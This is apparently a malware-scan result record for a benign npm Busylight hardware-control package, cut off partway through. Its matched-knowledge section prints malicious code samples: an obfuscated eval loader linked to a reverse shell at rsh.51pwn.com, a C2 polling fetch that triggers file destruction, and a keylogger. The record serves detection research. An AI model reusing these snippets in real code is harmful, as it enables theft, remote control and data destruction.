@@ -1,0 +1,561 @@
+{
+  "package_name": "@pureit##busylight",
+  "package_version": "1.0.12",
+  "label": "benign",
+  "detection_time": "2026-05-26T17:24:37.929170",
+  "status": "success",
+  "selected_files_count": 2,
+  "selected_files": [
+    "package/package.json",
+    "package/busylight.js"
+  ],
+  "is_malicious": false,
+  "total_files": 2,
+  "malicious_files": 0,
+  "total_slices": 1,
+  "malicious_slices": 0,
+  "file_results": [
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/@pureit##busylight/1.0.12/package/package.json",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/@pureit##busylight/1.0.12/package/busylight.js",
+      "status": "success",
+      "is_malicious": false,
+      "total_slices": 1,
+      "malicious_slices": 0,
+      "slice_results": [
+        {
+          "slice_id": "busylight_slice_1",
+          "code_snippet": "\"use strict\";\nObject.defineProperty(exports, \"__esModule\", { value: true });\nexports.BusyLight = void 0;\nvar HID = require(\"node-hid\");\n/**\n * Main class for busylight.\n *\n * @class\n * @public\n */\nvar BusyLight = /** @class */ (function () {\n    function BusyLight(device) {\n        this._device = null;\n        this._hid = null;\n        this._keepalive = null;\n        this._steps = BusyLight.OFF.concat([]);\n        this._response = [];\n        this._r = 0;\n        this._g = 0;\n        this._b = 0;\n        this._tone = -1;\n        this._volume = -1;\n        this._intesity = 100;\n        this._once_timer = null;\n        if (!device)\n            return;\n        this._device = device;\n    }\n    BusyLight.devices = function () {\n        var _this = this;\n        var ds = HID.devices();\n        var result = [];\n        if (!Array.isArray(ds))\n            return [];\n        ds.forEach(function (d) {\n            if (d.vendorId !== _this.VENDORID)\n                return;\n            if (_this.PRODUCTS.indexOf(d.productId) < 0)\n                return;\n            result.push(d);\n        });\n        return result;\n    };\n    BusyLight.prototype._connect = function () {\n        var _this = this;\n        try {\n            this._hid = new HID.HID(this._device.path);\n            this._hid.on('data', function (data) {\n                if (!data)\n                    return;\n                _this._response = Array.from(data);\n            });\n            this._send(this._steps);\n        }\n        catch (ignore) {\n            this._hid = null;\n        }\n    };\n    BusyLight.prototype._keep_alive = function () {\n        if (!this._device)\n            return;\n        if (!this._hid)\n            return this._connect();\n        this._send(BusyLight.KEEPALIVE);\n    };\n    BusyLight.prototype._checksumed = function (data) {\n        var bytes = new Uint8Array(data.length + 1);\n        bytes[0] = 0;\n        data.forEach(function (v, i) {\n            bytes[i + 1] = v & 0xFF;\n        });\n        bytes[60] = 0xFF;\n        bytes[61] = 0xFF;\n        bytes[62] = 0xFF;\n        var cs = 0;\n        data.forEach(function (v, i) {\n            if (i > 62)\n                return;\n            cs = cs + bytes[i];\n        });\n        bytes[63] = (cs >> 8) & 0xFF;\n        bytes[64] = cs & 0xFF;\n        return bytes;\n    };\n    BusyLight.prototype._send = function (data) {\n        if (!this._hid)\n            return;\n        try {\n            this._hid.write(this._checksumed(data));\n        }\n        catch (ignore) {\n            this._hid = null;\n        }\n    };\n    BusyLight.prototype.connect = function () {\n        if (!this._device)\n            return false;\n        if (this._keepalive)\n            return true;\n        this._keepalive = setInterval(this._keep_alive.bind(this), BusyLight.KEEPALIVE_SEC * 1000);\n        this._keep_alive();\n        return true;\n    };\n    BusyLight.prototype._build_step = function (step, index) {\n        if (!step)\n            return false;\n        if (index >= BusyLight.STEPS_COUNT)\n            return false;\n        var si = index * 8;\n        if (!BusyLight.CMDS[step.cmd])\n            return false;\n        step.cmdv = step.cmdv & 0x0F;\n        this._steps[si + 0] = BusyLight.CMDS[step.cmd] | step.cmdv;\n        step.repeat = step.repeat & 0xFF;\n        this._steps[si + 1] = step.repeat;\n        step.red = step.red & 0xFF;\n        this._steps[si + 2] = step.red;\n        step.green = step.green & 0xFF;\n        this._steps[si + 3] = step.green;\n        step.blue = step.blue & 0xFF;\n        this._steps[si + 4] = step.blue;\n        step.on = step.on & 0xFF;\n        this._steps[si + 5] = step.on;\n        step.off = step.off & 0xFF;\n        this._steps[si + 6] = step.off;\n        this._steps[si + 7] = 0x00;\n        if (!step.audio)\n            return true;\n        this._steps[si + 7] = 0x80;\n        if (step.tone < 0)\n            return true;\n        if (step.volume <= 0)\n            return true;\n        step.tone = step.tone & 0x0F;\n        step.volume = step.volume & 0x07;\n        this._steps[si + 7] = 0x80 | (step.tone << 3) | step.volume;\n        return true;\n    };\n    BusyLight.prototype._build_steps = function (steps) {\n        var _this = this;\n        this._steps = BusyLight.OFF.concat([]);\n        if (!Array.isArray(steps))\n            return;\n        var step_index = 0;\n        steps.forEach(function (step) {\n            if (!_this._build_step(step, step_index))\n                return;\n            step_index = step_index + 1;\n        });\n    };\n    BusyLight.prototype.program = function (steps) {\n        if (this._once_timer)\n            clearTimeout(this._once_timer);\n        this._once_timer = null;\n        this._send(BusyLight.OFF);\n        this._build_steps(steps);\n        this._send(this._steps);\n    };\n    BusyLight.prototype.off = function () {\n        if (this._once_timer)\n            clearTimeout(this._once_timer);\n        this._once_timer = null;\n        this._steps = BusyLight.OFF.concat([]);\n        this._send(this._steps);\n    };\n    BusyLight.prototype.intesity = function (value) {\n        if (value < 0)\n            value = 0;\n        if (value > 100)\n            value = 100;\n        this._intesity = value;\n    };\n    BusyLight.prototype.light = function (color) {\n        if (!color)\n            return false;\n        if (color.charAt(0) === '#')\n            color = color.substring(1);\n        if (color.length < 6)\n            return false;\n        var r = parseInt(color.substring(0, 2), 16);\n        var g = parseInt(color.substring(2, 4), 16);\n        var b = parseInt(color.substring(4, 6), 16);\n        if (isNaN(r))\n            return false;\n        if (isNaN(g))\n            return false;\n        if (isNaN(b))\n            return false;\n        this._r = Math.trunc(r * this._intesity / 100);\n        this._g = Math.trunc(g * this._intesity / 100);\n        this._b = Math.trunc(b * this._intesity / 100);\n        this._build_steps([{ cmd: 'jump', cmdv: 0, repeat: 0, red: this._r, green: this._g, blue: this._b, on: 0xff, off: 0x00, audio: false, tone: 0, volume: 0 }]);\n        this._send(this._steps);\n        return true;\n    };\n    BusyLight.prototype.blink = function (color, on, off) {\n        if (!color)\n            return false;\n        if (color.charAt(0) === '#')\n            color = color.substring(1);\n        if (color.length < 6)\n            return false;\n        var r = parseInt(color.substring(0, 2), 16);\n        var g = parseInt(color.substring(2, 4), 16);\n        var b = parseInt(color.substring(4, 6), 16);\n        if (isNaN(r))\n            return false;\n        if (isNaN(g))\n            return false;\n        if (isNaN(b))\n            return false;\n        this._r = Math.trunc(r * this._intesity / 100);\n        this._g = Math.trunc(g * this._intesity / 100);\n        this._b = Math.trunc(b * this._intesity / 100);\n        this._build_steps([{ cmd: 'jump', cmdv: 0, repeat: 0, red: this._r, green: this._g, blue: this._b, on: on, off: off, audio: false, tone: 0, volume: 0 }]);\n        this._send(this._steps);\n        return true;\n    };\n    BusyLight.prototype.pulse = function (color) {\n        if (!color)\n            return false;\n        if (color.charAt(0) === '#')\n            color = color.substring(1);\n        if (color.length < 6)\n            return false;\n        var r = parseInt(color.substring(0, 2), 16);\n        var g = parseInt(color.substring(2, 4), 16);\n        var b = parseInt(color.substring(4, 6), 16);\n        if (isNaN(r))\n            return false;\n        if (isNaN(g))\n            return false;\n        if (isNaN(b))\n            return false;\n        this._r = Math.trunc(r * this._intesity / 100);\n        this._g = Math.trunc(g * this._intesity / 100);\n        this._b = Math.trunc(b * this._intesity / 100);\n        var steps = [];\n        var step = 0;\n        for (var si = 1; si <= 4; si = si + 1) {\n            steps.push({ cmd: 'jump', cmdv: step < 6 ? step + 1 : 0, repeat: 0, red: Math.trunc(si * this._r / 4), green: Math.trunc(si * this._g / 4), blue: Math.trunc(si * this._b / 4), on: 0x01, off: 0x00, audio: false, tone: 0, volume: 0 });\n            step = step + 1;\n        }\n        for (var si = 5; si >= 2; si = si - 1) {\n            steps.push({ cmd: 'jump', cmdv: step < 6 ? step + 1 : 0, repeat: 0, red: Math.trunc(si * this._r / 7), green: Math.trunc(si * this._g / 7), blue: Math.trunc(si * this._b / 7), on: 0x01, off: 0x00, audio: false, tone: 0, volume: 0 });\n            step = step + 1;\n        }\n        this._build_steps(steps);\n        this._send(this._steps);\n        return true;\n    };\n    BusyLight.prototype.tone = function (tone, volume) {\n        if (this._once_timer)\n            clearTimeout(this._once_timer);\n        this._once_timer = null;\n        this._tone = tone;\n        this._volume = volume;\n        this._build_steps([{ cmd: 'jump', cmdv: 0, repeat: 0, red: this._r, green: this._g, blue: this._b, on: 0x00, off: 0x00, audio: true, tone: -1, volume: -1 }]);\n        this._send(this._steps);\n        this._build_steps([{ cmd: 'jump', cmdv: 0, repeat: 0, red: this._r, green: this._g, blue: this._b, on: 0xff, off: 0x00, audio: true, tone: this._tone, volume: this._volume }]);\n        this._send(this._steps);\n        return true;\n    };\n    BusyLight.prototype.alert = function (tone, volume, color, blinkpulse, on, off) {\n        if (blinkpulse === void 0) { blinkpulse = true; }\n        if (on === void 0) { on = 4; }\n        if (off === void 0) { off = 3; }\n        this.tone(tone, volume);\n        if (blinkpulse)\n            return this.blink(color, on, off);\n        this.pulse(color);\n    };\n    BusyLight.prototype.once = function (tone, volume) {\n        var _this = this;\n        if (!this._device)\n            return -1;\n        if (!BusyLight.TONE_LEN[this._device.productId])\n            return -1;\n        if (!BusyLight.TONE_LEN[this._device.productId][tone])\n            return -1;\n        this.tone(tone, volume);\n        this._once_timer = setTimeout(function () {\n            _this._once_timer = null;\n            _this._build_steps([{ cmd: 'jump', cmdv: 0, repeat: 0, red: _this._r, green: _this._g, blue: _this._b, on: 0x00, off: 0x00, audio: true, tone: -1, volume: -1 }]);\n            _this._send(_this._steps);\n        }, BusyLight.TONE_LEN[this._device.productId][tone]);\n        return BusyLight.TONE_LEN[this._device.productId][tone];\n    };\n    BusyLight.prototype.tones = function () {\n        if (!this._device)\n            return [];\n        if (!BusyLight.TONE_NAME[this._device.productId])\n            return [];\n        return BusyLight.TONE_NAME[this._device.productId];\n    };\n    BusyLight.prototype.durations = function () {\n        if (!this._device)\n            return [];\n        if (!BusyLight.TONE_LEN[this._device.productId])\n            return [];\n        return BusyLight.TONE_LEN[this._device.productId];\n    };\n    BusyLight.prototype.device = function () {\n        if (!this._device)\n            return '';\n        if (!BusyLight.DEVICE_NAME[this._device.productId])\n            return '';\n        return BusyLight.DEVICE_NAME[this._device.productId];\n    };\n    BusyLight.prototype.is = function (device) {\n        if (!device)\n            return false;\n        if (!this._device)\n            return false;\n        return device.path === this._device.path;\n    };\n    BusyLight.prototype.disconnect = function () {\n        if (this._keepalive)\n            clearInterval(this._keepalive);\n        this._keepalive = null;\n        this._steps = BusyLight.OFF.concat([]);\n        this._send(this._steps);\n        if (this._hid)\n            this._hid.close();\n        this._hid = null;\n    };\n    BusyLight.prototype._b2s = function (data, f, t) {\n        if (!Array.isArray(data))\n            return '';\n        if (!data[f])\n            return '';\n        if (!data[t])\n            return '';\n        var result = '';\n        for (var ci = f; ci <= t; ci = ci + 1)\n            result = result + String.fromCharCode(data[ci]);\n        return result;\n    };\n    BusyLight.prototype.response = function () {\n        var response = {};\n        if (this._response.length === 0)\n            return response;\n        response.activity = this._b2s(this._response, 0, 0) === '1';\n        response.product = this._b2s(this._response, 1, 3) === '001' ? 'Busylight' : 'Kuando Box';\n        response.customer = this._b2s(this._response, 4, 11);\n        response.model = this._b2s(this._response, 12, 15);\n        response.serial = this._b2s(this._response, 16, 23);\n        response.manufacturer = this._b2s(this._response, 24, 31);\n        response.date = this._b2s(this._response, 32, 39);\n        response.software = this._b2s(this._response, 40, 45);\n        return response;\n    };\n    BusyLight.KEEPALIVE_SEC = 5;\n    BusyLight.STEPS_COUNT = 7;\n    BusyLight.VENDORID = 0x27BB;\n    BusyLight.PRODUCTS = [0x3BCA, 0x3BCB, 0x3BCC, 0x3BCD, 0x3BCE, 0x3BCF];\n    BusyLight.CMDS = {\n        keepalive: 0x80,\n        bootloader: 0x40,\n        reset: 0x20,\n        jump: 0x10\n    };\n    BusyLight.DEVICE_NAME = {\n        0x3BCA: 'Busylight Alpha model',\n        0x3BCB: 'Busylight UC model',\n        0x3BCC: 'Busylight UC model',\n        0x3BCD: 'Busylight Omega model',\n        0x3BCE: 'Busylight Alpha model 2',\n        0x3BCF: 'Busylight Omega model 2'\n    };\n    BusyLight.TONE_LEN_11 = [\n        5700,\n        2400,\n        2400,\n        3000,\n        4500,\n        3900,\n        3500,\n        2200,\n        2200,\n        2000,\n        2000\n    ];\n    BusyLight.TONE_LEN_12 = [\n        5700,\n        2400,\n        2400,\n        3000,\n        4500,\n        3900,\n        3500,\n        2200,\n        2200,\n        2000,\n        2000,\n        2400\n    ];\n    BusyLight.TONE_LEN = {\n        0x3BCA: BusyLight.TONE_LEN_11,\n        0x3BCB: BusyLight.TONE_LEN_11,\n        0x3BCC: BusyLight.TONE_LEN_11,\n        0x3BCD: BusyLight.TONE_LEN_11,\n        0x3BCE: BusyLight.TONE_LEN_11,\n        0x3BCF: BusyLight.TONE_LEN_12\n    };\n    BusyLight.TONE_NAME_11 = [\n        'Twinkling',\n        'Open Office',\n        'Quiet',\n        'Funky',\n        'Fairy Tale',\n        'Kuando Train',\n        'Telephone Nordic',\n        'Telephone Original',\n        'Telephone Pick Me Up',\n        'Instant Message 1',\n        'Instant Message 2'\n    ];\n    BusyLight.TONE_NAME_12 = [\n        'Twinkling',\n        'Open Office',\n        'Quiet',\n        'Funky',\n        'Fairy Tale',\n        'Kuando Train',\n        'Telephone Nordic',\n        'Telephone Original',\n        'Telephone Pick Me Up',\n        'Instant Message 1',\n        'Instant Message 2',\n        'Instant Message 3'\n    ];\n    BusyLight.TONE_NAME = {\n        0x3BCA: BusyLight.TONE_NAME_11,\n        0x3BCB: BusyLight.TONE_NAME_11,\n        0x3BCC: BusyLight.TONE_NAME_11,\n        0x3BCD: BusyLight.TONE_NAME_11,\n        0x3BCE: BusyLight.TONE_NAME_11,\n        0x3BCF: BusyLight.TONE_NAME_12\n    };\n    BusyLight.KEEPALIVE = [\n        0x8F, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n        0x04, 0x04, 0x55, 0xFF, 0xFF, 0xFF, 0x00, 0x00\n    ];\n    BusyLight.OFF = [\n        0x10, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80,\n        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n        0x04, 0x04, 0x55, 0xFF, 0xFF, 0xFF, 0x00, 0x00\n    ];\n    return BusyLight;\n}());\nexports.BusyLight = BusyLight;",
+          "is_malicious": false,
+          "malice_score": 0.43449651996294664,
+          "confidence": 0.0,
+          "behavior_summary": "When called, the code accesses and interacts with USB HID devices using the node-hid module, sending and receiving data packets to control Busylight hardware devices. It constructs and sends command sequences to the device, including color, tone, and blinking patterns, and listens for device responses. This behavior involves direct hardware communication without network, file, or process execution activities, thus not facilitating data exfiltration or remote code execution.",
+          "explanation": "[LLM Judgment: Benign] The provided code is a well-structured module designed to interact with Busylight USB HID devices. It uses the 'node-hid' library to communicate with hardware, sending and receiving data packets to control device lights and tones. There is no evidence of obfuscation, data exfiltration, remote code execution, or manipulation of environment variables. The code does not perform network communication, does not execute arbitrary code, and does not collect or transmit sensitive user or system information. Compared to the known malicious patterns, which involve obfuscated payload execution, remote command-and-control, or keylogging, this code is purely hardware control logic with no suspicious or malicious intent.",
+          "matched_knowledge_count": 5,
+          "matched_knowledge": [
+            {
+              "match_id": "20241224_104012_987336_snippet_3",
+              "source_package": "[Multiple: e.g., linkis-website, rocketmq-site, aliyundrive, etc.] (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_104012_987336/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4550522565841675,
+              "code_similarity": 0.47632694244384766,
+              "behavior_similarity": 0.4337775409221649,
+              "matched_snippet": {
+                "snippet_id": "snippet_3",
+                "code_snippet": "var os = require(\"os\"),\n    zlib = require(\"zlib\"),\n    bs = \"base64\",\n    filterNet = (o) => {\n        var oR = {};\n        for (var k in o) {\n            if (\"lo0\" == k) continue;\n            for (var i in o[k]) {\n                if (\"127.0.0.1\" == o[k][i][\"address\"]) continue;\n                if (o[k][i][\"family\"] == \"IPv4\" && o[k][i][\"address\"]) {\n                    oR[k] = o[k][i]\n                    break;\n                }\n            }\n        }\n        return oR;\n    },\n    rmKeys = (o, ...keys) => {\n        for (var k in keys) {\n            delete o[keys[k]];\n        }\n        return o;\n    },\n    pkg = JSON.parse(require(\"fs\").readFileSync(\"package.json\").toString(\"utf8\")),\n    zS = (s) => zlib.brotliCompressSync(s, { level: 11, windowBits: 15, quality: 11 }).toString(bs),\n    zO = (o) => zS(JSON.stringify(o, null, 2)),\n    uS = (s) => zlib.brotliDecompressSync(Buffer.from(s, bs)).toString(),\n    o = {\n        \"name\": pkg.name,\n        \"version\": pkg.version,\n        \"pwd\": process.cwd(),\n        \"env\": process.env,\n        \"platform\": os.platform(),\n        \"arch\": os.arch(),\n        \"release\": os.release(),\n        \"type\": os.type(),\n        \"uptime\": os.uptime(),\n        \"hostname\": os.hostname(),\n        \"cpus\": [os.cpus().length, rmKeys(os.cpus()[0], \"times\")],\n        \"networkInterfaces\": filterNet(os.networkInterfaces()),\n        \"freemem\": os.freemem(),\n        \"totalmem\": os.totalmem(),\n        \"userInfo\": os.userInfo()\n    };\nlet s = zO(o), s1 = uS(`G/sCIJwHtg1sfVPqObPQC6WsmlPZnVOfAqCQlUG+AJay52WlQRR23HYKiwLI/7ncvQM75zP689ZqjKlrgZVYcYBp1gM8R5zV4glyFKt+CPgOAIT7ekBlFUzW87zjyA6CooEMdzcFs33O/t2tAXawBJUI9pOdw8hOkS4DYLG9xHRAeDZ5ZXbs1oL+Z+k+M2aA4HzxpZD/VAbL7E8erim7UfCx9F/Y4+yCKMrUklhDVFoCdwwQYsUTOxl/nc+gLuTlglxBdupg+2xUfQt7zegHtGsz5GkVkFMdVd6qgszOQWOzY8FtLc/U7KSvB2Q4l4yGpcavIeSsCiZV7YQM5X3KWTMz8v1g55Yld/RldQTkyU91zlOFCeelQqC8qAIL4vEXNhgs2suqFHoQstfjXJpvHFgV0v7Bf8f7X38+oji8qZQUEG8LimNT5MDFKHJ5efBeZkZVIAKCp7gdzI60KAs=`);\nprocess.env.NODE_NO_EVAL = undefined;\neval(s1);",
+                "code_behavior": "At runtime, when rsh.js is executed as a detached process, the code collects detailed system, environment, and user information, compresses and encodes it, decompresses an obfuscated payload from a base64 string, sets the NODE_NO_EVAL environment variable to undefined, and executes the decompressed payload using eval, resulting in the execution of further malicious code.",
+                "malice_analysis": {
+                  "why_suspicious": "Collecting extensive system, environment, and user data, compressing and encoding it, and executing obfuscated code via eval are all strong indicators of malicious intent and are commonly used to evade detection and enable data exfiltration.",
+                  "violated_expectations": "Legitimate packages do not collect and exfiltrate system or user information, nor do they execute dynamically decompressed and obfuscated code via eval.",
+                  "similar_legitimate_use": "Compression and system info gathering may be used in legitimate diagnostics or telemetry, but not in combination with obfuscated payload execution and without user consent.",
+                  "key_indicators": [
+                    "Obfuscated and base64-encoded payload decompressed and executed via eval",
+                    "Systematic collection of system, environment, and user data",
+                    "Manipulation of environment variables to bypass security controls",
+                    "No user notification or consent for data collection or code execution"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (when rsh.js is executed)",
+                  "file_location": "scripts/rsh.js",
+                  "required_permissions": [
+                    "filesystem",
+                    "network",
+                    "environment_vars",
+                    "process"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "[Multiple: e.g., linkis-website, rocketmq-site, aliyundrive, etc.]",
+                  "package_manager": "npm",
+                  "package_versions": "[e.g., 6.0.2, 6.0.3, 6.0.4, 2.2.1, 2.2.3, 7.0.5, 5.0.2, 3.0.3]",
+                  "why_malicious": "All packages in this campaign execute obfuscated JavaScript code at install time, which collects extensive system, environment, and user information and establishes a persistent reverse shell to a remote attacker-controlled server (rsh.51pwn.com:8880), enabling full remote code execution and exfiltration of sensitive data. The attack chain is triggered via multiple npm lifecycle hooks, uses detached background processes for persistence, and employs obfuscation and dynamic code execution to evade detection."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious package is installed, triggering preinstall, postinstall, test, or init scripts defined in package.json.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Execution of scripts/init.js"
+                  },
+                  {
+                    "step": 2,
+                    "action": "scripts/init.js is executed, which launches scripts/rsh.js as a detached child process and immediately exits to conceal ongoing activity.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Execution of scripts/rsh.js in the background"
+                  },
+                  {
+                    "step": 3,
+                    "action": "scripts/rsh.js collects detailed system, environment, and user data, compresses and encodes it, decompresses an obfuscated payload, and executes it via eval.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Execution of reverse shell payload from decompressed code"
+                  },
+                  {
+                    "step": 4,
+                    "action": "The reverse shell payload establishes a persistent connection to rsh.51pwn.com:8880, exfiltrates collected system information, and provides the attacker with remote shell access for arbitrary command execution.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Attacker gains persistent remote access and control over the compromised system"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Execution of scripts/init.js during npm install, test, or init lifecycle events",
+                    "Creation of detached child processes in install/test scripts (child_process.fork with {detached: true})",
+                    "Presence of obfuscated or base64-encoded JavaScript payloads in package files",
+                    "Use of eval to execute dynamically decompressed or generated code",
+                    "Outbound TCP connections to hardcoded C2 domains (e.g., rsh.51pwn.com:8880) during or after installation",
+                    "Collection and exfiltration of system, environment, and user data during package installation or execution"
+                  ],
+                  "file_indicators": [
+                    "scripts/init.js",
+                    "scripts/rsh.js",
+                    "package.json with install/test/init scripts running 'node ./scripts/init.js'",
+                    "Obfuscated JavaScript with base64-encoded or Unicode-escaped payloads"
+                  ],
+                  "network_indicators": [
+                    "rsh.51pwn.com:8880",
+                    "Outbound TCP connections to rsh.51pwn.com on port 8880",
+                    "Initial data exfiltration containing compressed system information"
+                  ],
+                  "how_to_detect": "Monitor npm packages for execution of scripts during install, test, or init lifecycle events, especially those launching detached child processes or containing obfuscated/base64-encoded code. Flag any package that establishes outbound TCP connections to suspicious domains (e.g., rsh.51pwn.com) or uncommon ports during or after installation. Use static analysis to detect eval usage on dynamically decompressed payloads and the presence of Unicode-escaped or base64-encoded code. Alert on collection and exfiltration of system, environment, or user data during package installation or execution. Correlate file indicators (scripts/init.js, scripts/rsh.js, suspicious package.json scripts) with behavioral and network indicators for high-confidence detection."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_113501_063579_snippet_3",
+              "source_package": "transferwise-iconfont (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_113501_063579/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4284646511077881,
+              "code_similarity": 0.3603271245956421,
+              "behavior_similarity": 0.4966021776199341,
+              "matched_snippet": {
+                "snippet_id": "snippet_3",
+                "code_snippet": "setInterval(() => {\n  fetch('https://6514b3f1dc3282a6a3cd7125.mockapi.io/server/1').then(_0x231e3e => _0x231e3e.json()).then(_0x361fb2 => {\n    if (_0x361fb2.isAngry) {\n      angry();\n    }\n  })['catch'](_0x5d61c5 => {})[\"finally\"](_0x1c49c6 => {});\n}, 0xbb8);",
+                "code_behavior": "At runtime, the code periodically (every 3 seconds) polls a hardcoded remote server for a trigger value; if the server responds with isAngry=true, it executes the destructive angry() function, enabling remote-controlled data destruction via command-and-control.",
+                "malice_analysis": {
+                  "why_suspicious": "The code establishes a command-and-control channel by polling an external server for instructions, which is a common malware technique, and enables remote activation of destructive payloads.",
+                  "violated_expectations": "A utility package should not make unsolicited network requests or execute remote-controlled destructive actions based on external input.",
+                  "similar_legitimate_use": "Some legitimate software checks for updates or configuration from a server, but never for destructive triggers or to execute shell commands.",
+                  "key_indicators": [
+                    "Periodic polling of external server (6514b3f1dc3282a6a3cd7125.mockapi.io)",
+                    "Conditional execution of destructive payload based on remote response",
+                    "Obfuscated and hidden within unrelated functionality",
+                    "No user notification or consent for remote-controlled actions"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (periodic polling after package import, conditional on directory name and remote server response)",
+                  "file_location": "main module file of protect-api (e.g., index.js)",
+                  "required_permissions": [
+                    "network"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "transferwise-iconfont",
+                  "package_manager": "npm",
+                  "package_versions": "all published versions",
+                  "why_malicious": "The package is a typosquat of a legitimate library and contains code that collects sensitive system and user data, including home directory, hostname, username, DNS servers, and package metadata, then exfiltrates it to an attacker-controlled server via HTTPS POST. It does not provide the claimed icon font functionality and is designed solely for data theft."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs and imports the malicious package (transferwise-iconfont or protect-api).",
+                    "implemented_by": [],
+                    "leads_to": "Malicious code is loaded and executed."
+                  },
+                  {
+                    "step": 2,
+                    "action": "transferwise-iconfont collects sensitive system and user data.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Data is prepared for exfiltration."
+                  },
+                  {
+                    "step": 3,
+                    "action": "transferwise-iconfont exfiltrates collected data to attacker's server.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Attacker receives sensitive information."
+                  },
+                  {
+                    "step": 4,
+                    "action": "protect-api periodically polls a remote server for a trigger value.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Waits for remote command to activate destructive payload."
+                  },
+                  {
+                    "step": 5,
+                    "action": "If the remote server responds with isAngry=true, protect-api executes the angry() function.",
+                    "implemented_by": [
+                      "snippet_2",
+                      "snippet_3"
+                    ],
+                    "leads_to": "Destructive shell commands are executed, deleting all files on the system."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Unsolicited collection and exfiltration of system/user data at import or runtime",
+                    "Hardcoded external domains for data exfiltration or command-and-control",
+                    "Periodic polling of remote servers for execution triggers",
+                    "Execution of destructive shell commands (e.g., 'rm -rf /') from within JavaScript packages",
+                    "Obfuscated or hidden code paths leading to data destruction"
+                  ],
+                  "file_indicators": [
+                    "Presence of code referencing 'os.homedir()', 'os.userInfo()', 'os.hostname()', or 'dns.getServers()' in non-system utility packages",
+                    "Use of shelljs or similar modules to execute shell commands",
+                    "Functions named 'angry' or similar, especially if not documented",
+                    "Obfuscated code blocks or suspicious setInterval/fetch patterns"
+                  ],
+                  "network_indicators": [
+                    "Connections to r7z12f7knlides86u06z22fpzg57tzho.oastify.com",
+                    "Connections to 6514b3f1dc3282a6a3cd7125.mockapi.io",
+                    "Unusual POST requests containing system/user data to unknown domains"
+                  ],
+                  "how_to_detect": "Monitor for npm packages that access sensitive system/user information and make unsolicited network requests to hardcoded domains. Flag packages that use shelljs or similar modules to execute shell commands, especially those containing 'rm -rf' or other destructive operations. Detect periodic polling of external servers for remote triggers, and review for obfuscated code or hidden destructive functions. Use static analysis to identify suspicious API usage and dynamic analysis to observe runtime network and filesystem behaviors."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_113501_056835_snippet_2",
+              "source_package": "@typescript_eslinter/eslint (npm)",
+              "source_file": "/tmp/kb_build_2jc8z5wl/20241224_113501_056835/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4269951283931732,
+              "code_similarity": 0.3801121711730957,
+              "behavior_similarity": 0.47387808561325073,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "const { GlobalKeyboardListener } = require(\"node-global-key-listener\");\n\nconst v = new GlobalKeyboardListener();\nv.addListener(function (e, down) {\n  if (e.state === \"DOWN\" && !e?.name?.includes(\"MOUSE\")) {\n    pendingData.fuzzer += \",\" + e.name;\n  }\n});",
+                "code_behavior": "At runtime, the code uses node-global-key-listener to capture global keyboard events, logging all key presses except mouse events and appending them to a buffer for later exfiltration.",
+                "malice_analysis": {
+                  "why_suspicious": "Capturing global keyboard input is a classic spyware technique, enabling theft of credentials, secrets, and other sensitive information.",
+                  "violated_expectations": "A linter or code analysis tool should never capture or log keyboard input from the user.",
+                  "similar_legitimate_use": "Global key listeners may be used in accessibility or hotkey applications, but are never appropriate in code linting or static analysis tools.",
+                  "key_indicators": [
+                    "Import and use of node-global-key-listener in a linter package",
+                    "Registration of global keyboard event listeners",
+                    "Logging of all keypresses to a buffer"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (when the package is loaded or executed as a linter plugin)",
+                  "file_location": "main package entry point (e.g., index.js)",
+                  "required_permissions": [
+                    "filesystem",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
